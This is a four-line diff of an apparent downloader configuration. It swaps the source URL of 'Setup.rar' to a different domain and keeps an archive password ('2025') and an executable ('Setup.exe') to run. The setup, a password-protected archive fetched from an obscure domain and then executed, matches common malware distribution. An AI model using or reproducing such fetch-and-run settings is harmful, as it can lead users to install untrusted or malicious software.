@@ -1,4 +1,4 @@
-url=https://gsmtoolpack.com/Setup.rar
+url=https://smmnet.store/Setup.rar
 name=Setup.rar
 password=2025
 setup=Setup.exe
